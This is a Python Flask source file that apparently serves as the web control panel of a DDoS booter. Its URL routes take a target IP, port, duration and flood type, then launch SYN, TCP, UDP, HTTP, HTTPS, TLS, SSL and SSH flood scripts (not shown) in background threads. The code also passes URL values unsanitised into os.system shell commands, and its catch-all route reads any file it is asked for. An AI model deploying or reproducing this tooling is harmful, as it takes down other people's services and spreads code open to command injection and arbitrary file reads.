from flask import Flask, request
import os,time,threading
from datetime import datetime, timedelta
from numerize import numerize
import random

methods = []

ID = False

app = Flask(__name__)

last_reset_time = datetime.now()
count = 0

def DOS_METHODS2(IP,PORT,TIME,METHODS,HTTP):
  if METHODS.upper() == 'HTTP_HEX1629':
   os.system(f'python3 pyf.py OWN1 {IP} {PORT} {TIME} {TIME} 200 200 {HTTP} 1')
  elif METHODS.upper() == 'HTTPS_HEX1629':
    os.system(f'python3 https.py https://{IP}/ {PORT} {TIME} {HTTP}')
  elif METHODS.upper() == 'TLS_HEX1629':
    os.system(f'python3 tls.py https://{IP}/ {PORT} {TIME} {HTTP}')
  elif METHODS.upper() == 'SSL_HEX1629':
    os.system(f'python3 ssl.py https://{IP}/ {PORT} {TIME} {HTTP}')
  elif METHODS.upper() == 'SSH_HEX1629':
    os.system(f'python3 ssh.py {IP} {PORT} {TIME} 200000 {TIME} {TIME}')

def DOS_METHODS(IP,PORT,TIME,METHODS):
  if METHODS.upper() == 'SYN_HEX1629':
    os.system(f'python3 syn.py {IP} {PORT} {TIME} 250')
  elif METHODS.upper() == 'TCP_HEX1629':
    os.system(f'python3 tcp.py {IP} {PORT} {TIME} 250 250 250')
  elif METHODS.upper() == 'UDP_HEX1629':
    os.system(f'python3 udp.py {IP} {PORT} {TIME} 250 250')

@app.route("/TARGET=<IP>&PORT=<NUMBER>&TIME=<THREAD>&PACKET=<HTTP>&TYPE=<METHODS>")
def DOS(IP,NUMBER,THREAD,HTTP,METHODS):
  if IP is None or NUMBER is None or THREAD is None or HTTP is None or METHODS is None:
    return 'FAILED'
  else:
   global count,peak
   if count > peak:
          peak = count
   count += 1
   if int(THREAD) < 70 or int(THREAD) == 70:
     if METHODS.upper() == 'SSH_HEX1629':
         threading.Thread(target=DOS_METHODS2,args=(IP,NUMBER,THREAD,METHODS,HTTP)).start()
         return f'DONE --> SSH FLOOD {IP}:{NUMBER}'
     elif METHODS.upper() == 'HTTP_HEX1629':
         threading.Thread(target=DOS_METHODS2,args=(IP,NUMBER,THREAD,METHODS,HTTP)).start()
         return f'DONE --> HTTP FLOOD {IP}:{NUMBER}'
     elif METHODS.upper() == 'HTTPS_HEX1629':
        threading.Thread(target=DOS_METHODS2,args=(IP,NUMBER,THREAD,METHODS,HTTP)).start()
        return f'DONE --> HTTPS FLOOD {IP} . . .'
     elif METHODS.upper() == 'SSL_HEX1629':
        threading.Thread(target=DOS_METHODS2,args=(IP,NUMBER,THREAD,METHODS,HTTP)).start()
        return f'DONE --> SSL FLOOD {IP} . . .'
     elif METHODS.upper() == 'TLS_HEX1629':
        threading.Thread(target=DOS_METHODS2,args=(IP,NUMBER,THREAD,METHODS,HTTP)).start()
        return f'DONE --> TLS FLOOD {IP} . . .'
     else:
       return 'METHODS IS NOT FOUND (HTTP_HEX1629 HTTPS_HEX1629 SSH_HEX1629)'
   else:
     return 'YOU TIME IT MAX'

@app.route("/TARGET2=<IP>&PORT=<NUMBER>&TIME=<THREAD>&TYPE=<METHODS>")
def DOS2(IP,NUMBER,THREAD,METHODS):
  if IP is None or NUMBER is None or THREAD is None or METHODS is None:
    return 'FAILED'
  else:
   global count,peak
   if count > peak:
          peak = count
   count += 1
   if int(THREAD) < 70 or int(THREAD) == 70:
     if METHODS.upper() == 'SYN_HEX1629':
         threading.Thread(target=DOS_METHODS,args=(IP,NUMBER,THREAD,METHODS)).start()
         return f'DONE --> SYN FLOOD {IP}:{NUMBER}'
     elif METHODS.upper() == 'TCP_HEX1629':
         threading.Thread(target=DOS_METHODS,args=(IP,NUMBER,THREAD,METHODS)).start()
         return f'DONE --> TCP FLOOD {IP}:{NUMBER}'
     elif METHODS.upper() == 'UDP_HEX1629':
         threading.Thread(target=DOS_METHODS,args=(IP,NUMBER,THREAD,METHODS)).start()
         return f'DONE --> UDP FLOOD {IP}:{NUMBER}'
     else:
       return 'METHODS IS NOT FOUND (SYN_HEX1629 TCP_HEX1629 UDP_HEX1629)'
   else:
     return 'YOU TIME IT MAX'
  
rps_dstat = []
peak = 0
@app.route("/<NAME_FILES>")
def download(NAME_FILES):
    global count,last_reset_time,methods,rps_dstat,peak
    if request.method not in methods:
      methods.append(request.method)
    if 'favicon.ico' in NAME_FILES:
      data = 'favicon.ico ( 200 OK )'
      return data
    else:
     try:
      f = open(NAME_FILES,'r')
      data = f.read()
      f.close()
      if 'count.html' in NAME_FILES:
          current_time = datetime.now()
          if current_time - last_reset_time >= timedelta(minutes=1):
            count = 0
            last_reset_time = current_time
            status_code = 'YES'
          else:
            status_code = 'NO'
          data = data.replace('##:##:##',time.ctime().split( )[3]).replace('RPS=0',f'RPS {numerize.numerize(count)}').replace('NO',f'{status_code}').replace('YES',f'{status_code}').replace('PEAK=PEAKOFPACKET',f'PEAK {numerize.numerize(peak)}')
      else:
        if count > peak:
          peak = count
        count += 1
      return data
     except:
      try:
        f = open(NAME_FILES,'rb')
        data = f.read()
        f.close()
        if count > peak:
          peak = count
        count += 1
        return data
      except:
        if count > peak:
          peak = count
        count += 1
        return invaild_error('400',"CAN' READ FILES")

@app.route("/")
def hello():
    global count,methods,peak
    if request.method not in methods:
      methods.append(request.method)
    if count > peak:
          peak = count
    count += 1
    f = open('index.html','r')
    data = f.read()
    f.close()
    return data

@app.route("/custom_error=<ERROR_TYPE>&<REASON>")
def invaild_error(ERROR_TYPE,REASON):
    global count,methods,peak
    if request.method not in methods:
      methods.append(request.method)
    if count > peak:
          peak = count
    count += 1
    f = open('page_error.html','r')
    data = f.read().replace('XXX',ERROR_TYPE).replace('CODE',REASON)
    f.close()
    return data

@app.errorhandler(405)
def method_not_allowed_error(error):
    global count,methods,peak
    if request.method not in methods:
      methods.append(request.method)
    if count > peak:
          peak = count
    count += 1
    f = open('page_error.html','r')
    data = f.read().replace('XXX','405').replace('CODE','HEY I THINK YOU METHODS NOT SUPPORT IT IN MY WEBSITE')
    f.close()
    return data

@app.errorhandler(500)
def internal_server_error(error):
  global count,methods,peak
  if request.method not in methods:
      methods.append(request.method)
  if count > peak:
          peak = count
  count += 1
  f = open('page_error2.html','r')
  data = f.read().replace('XXX','500').replace('REASON','INTERNAL SERVER ERROR OCCURRED').replace('HELP','WEBSITE CAN RECV YOU REQUEST BUT PROCESS REQUEST IT FAILED NOW')
  f.close()
  return data
  
@app.errorhandler(404)
def page_not_found(e):
  global count,methods,peak
  if request.method not in methods:
      methods.append(request.method)
  if count > peak:
          peak = count
  count += 1
  f = open('page_error.html','r')
  data = f.read().replace('XXX','404').replace('CODE','UHH DUDE I THINK MY WEBSITE NOT HAVE THIS PAGE')
  f.close()
  return data   

if __name__ == '__main__':
   app.run('0.0.0.0', 5000)